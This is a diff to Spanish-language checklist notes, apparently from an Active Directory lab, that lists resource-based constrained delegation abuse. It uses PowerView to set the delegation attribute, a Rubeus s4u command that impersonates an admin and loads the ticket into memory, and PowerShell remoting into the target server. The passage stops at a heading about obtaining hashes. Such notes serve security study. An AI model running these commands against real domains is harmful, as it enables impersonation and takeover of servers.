@@ -52,3 +52,10 @@
 - [ ] `Set-DomainObject -Identity mgmtsrv -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SD}`
 - [ ] `Get-DomainObject -Identity mgmtsrv -Properties 'msds-allowedtoactonbehalfofotheridentity'`
 ### Obtener hash 
+- [ ] `Rubeus.exe s4u /user:studvm$ /rc4:<hash_studvm$> /impersonateuser:techadmin /msdsspn:cifs/mgmtsrv.tech.corp /domain:tech.corp /ptt`
+
+### Acceder a la maquina con el hash cargado en memoria
+- [ ] `Invoke-Command -ComputerName mgmtsrv.tech.corp -ScriptBlock { hostname; whoami }`
+- [ ] `Enter-PSSession -ComputerName mgmtsrv.tech.corp -Authentication Kerberos`
+
+### Obtener hash de maquina y usuario
